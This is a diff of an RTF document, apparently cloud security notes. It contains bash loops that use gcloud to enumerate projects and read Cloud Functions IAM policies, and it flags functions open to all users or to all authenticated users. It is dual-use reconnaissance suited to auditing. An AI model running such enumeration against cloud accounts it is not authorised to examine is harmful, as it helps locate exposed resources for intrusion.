+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf11 \cb8 echo\cf7 \cb8 \'a0\cf10 \cb8 "[!]\'a0Open\'a0to\'a0all\'a0users:\'a0\cf12 $proj\cf10 :\'a0\cf12 $run\cf10 "
+\f3\fs29\fsmilli14667 \cf2 \cb8 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 fi
+\f3\fs29\fsmilli14667 \cf2 \cb8 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 if\cf7 \'a0[\'a0-z\'a0\cf10 "\cf12 $all_auth\cf10 "\cf7 \'a0]
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 then\cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0:
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\cf9 else
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf11 echo\cf7 \'a0\cf10 "[!]\'a0Open\'a0to\'a0all\'a0authenticated\'a0users:\'a0\cf12 $proj\cf10 :\'a0\cf12 $run\cf10 "
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 fi
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\cf9 done
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f4\fs18\fsmilli9333 \cf7 \cb8  
+\f1\fs26\fsmilli13333 \cf9 done
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\sl337\sa133\qj\partightenfactor0
+
+\f2\b \cf2 \cb5 \
+Enumerate open cloud functions\
+\
+\pard\pardeftab720\li480\fi-480\sl360\partightenfactor0
+
+\f1\b0\fs26\fsmilli13333 \cf9 \cb8 for\cf7 \'a0proj\'a0\cf9 in\cf7 \'a0$(gcloud\'a0projects\'a0list\'a0--format=\cf10 "get(projectId)"\cf7 );\'a0\cf9 do
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\sa213\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\cf11 echo\cf7 \'a0\cf10 "[*]\'a0scraping\'a0project\'a0
+\f3 \cf12 $proj
+\f1 \cf10 "
+\f3\fs29\fsmilli14667 \cf2 \cb8 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0enabled=$(gcloud\'a0services\'a0list\'a0--project\'a0\cf10 "
+\f3 \cf12 $proj
+\f1 \cf10 "\cf7 \'a0|\'a0grep\'a0\cf10 "Cloud\'a0Functions\'a0API"\cf7 )
+\f3\fs29\fsmilli14667 \cf2 \cb8 \
+
+\f4\fs18\fsmilli9333 \cf7 \cb5  
+\f1\fs26\fsmilli13333 \'a0\'a0\'a0\'a0\cf9 if\cf7 \'a0[\'a0-z\'a0\cf10 "
+\f3 \cf12 $enabled
+\f1 \cf10 "\cf7 \'a0];\'a0\cf9 then
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\cf11 continue
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\sa213\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\cf9 fi
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\cf9 for\cf7 \'a0func_region\'a0\cf9 in\cf7 \'a0$(gcloud\'a0\cf11 functions\cf7 \'a0list\'a0--quiet\'a0--project\'a0\cf10 "
+\f3 \cf12 $proj
+\f1 \cf10 "\cf7 \'a0--format=\cf10 "value[separator=','](NAME,REGION)"\cf7 );\'a0\cf9 do
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\sa213\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0
+\f5\i \cf13 #\'a0drop\'a0substring\'a0from\'a0first\'a0occurence\'a0of\'a0","\'a0to\'a0end\'a0of\'a0string.
+\f3\i0\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0func=\cf10 "
+\f3 \cf12 $\{func_region%%,*\}
+\f1 \cf10 "
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\sa213\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0
+\f5\i \cf13 #\'a0drop\'a0substring\'a0from\'a0start\'a0of\'a0string\'a0up\'a0to\'a0last\'a0occurence\'a0of\'a0","
+\f3\i0\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0region=\cf10 "
+\f3 \cf12 $\{func_region##*,\}
+\f1 \cf10 "
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\sa213\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0ACL=\cf10 "
+\f3 \cf12 $(gcloud\'a0functions\'a0get-iam-policy\'a0"$func"\'a0--project\'a0"$proj"\'a0--region\'a0"$region")
+\f1 \cf10 "
+\f3\fs29\fsmilli14667 \cf2 \cb8 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0all_users=\cf10 "
+\f3 \cf12 $(echo\'a0"$ACL"\'a0|\'a0grep\'a0allUsers)
+\f1 \cf10 "
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0all_auth=\cf10 "
+\f3 \cf12 $(echo\'a0"$ACL"\'a0|\'a0grep\'a0allAuthenticatedUsers)
+\f1 \cf10 "
+\f3\fs29\fsmilli14667 \cf2 \cb5 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\cf9 if\cf7 \'a0[\'a0-z\'a0\cf10 "
+\f3 \cf12 $all_users
+\f1 \cf10 "\cf7 \'a0]
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\sa213\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\cf9 then\cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0:
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\cf9 else
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf11 echo\cf7 \'a0\cf10 "[!]\'a0Open\'a0to\'a0all\'a0users:\'a0
+\f3 \cf12 $proj
+\f1 \cf10 :\'a0
+\f3 \cf12 $func
+\f1 \cf10 "
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\sa213\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\cf9 fi
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\partightenfactor0
+\cf2 \cb8 \
+\pard\pardeftab720\li480\fi-480\sl360\sa213\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 if\cf7 \'a0[\'a0-z\'a0\cf10 "
+\f3 \cf12 $all_auth
+\f1 \cf10 "\cf7 \'a0]
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 then\cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0:
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 else
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\sa213\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf11 echo\cf7 \'a0\cf10 "[!]\'a0Open\'a0to\'a0all\'a0authenticated\'a0users:\'a0
+\f3 \cf12 $proj
+\f1 \cf10 :\'a0
+\f3 \cf12 $func
+\f1 \cf10 "
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\cf9 fi
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\sa213\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\cf9 done
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\li480\fi-480\sl360\partightenfactor0
+
+\f4\fs18\fsmilli9333 \cf7 \cb8  
+\f1\fs26\fsmilli13333 \cf9 done
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\sl337\sa133\qj\partightenfactor0
+
+\f2\b \cf2 \cb5 \
+\
+\pard\pardeftab720\li480\fi-480\sl360\sa213\partightenfactor0
+
+\f1\b0\fs26\fsmilli13333 \cf7 \cb8 \
+\
+
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\sl285\sa213\partightenfactor0
+
+\f2\b\fs26\fsmilli13333 \cf6 \cb1 \
+\
+
+\f1\b0 \
+
+\f3\fs29\fsmilli14667 \cf2 \
+\
+\
+\
+\
+\
+\pard\pardeftab720\sa133\partightenfactor0
+
+\f1\fs26\fsmilli13333 \cf2 \
+\
+\
+\
+\
+\
+
+\f2\b \
+\
+
+\f1\b0 \
+\
+\pard\pardeftab720\sl368\partightenfactor0
+
+\fs29\fsmilli14667 \cf2 \cb5 \
+\
+\pard\pardeftab720\sl337\sa133\qj\partightenfactor0
+\cf2 \
+\
+\
+\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f2\b\fs28 \cf3 \cb4 \
+\pard\pardeftab720\li960\sl337\sa133\qj\partightenfactor0
+
+\f1\b0\fs29\fsmilli14667 \cf2 \cb5 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\fs28 \cf3 \cb4 \
+
+\f3\fs29\fsmilli14667 \cf2 \
+\pard\pardeftab720\sl299\partightenfactor0
+\cf2 \
+\
+\pard\pardeftab720\partightenfactor0
+\cf2 \
+\pard\pardeftab720\sa133\partightenfactor0
+
+\f2\b\fs26\fsmilli13333 \cf2 \cb1 \
+
+\f1\b0 \
+\
+\
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\f0\b\fs24 \cf0 \kerning1\expnd0\expndtw0 \
+\
+\
+\
+\
+
+\f3\b0 \
+\
+}
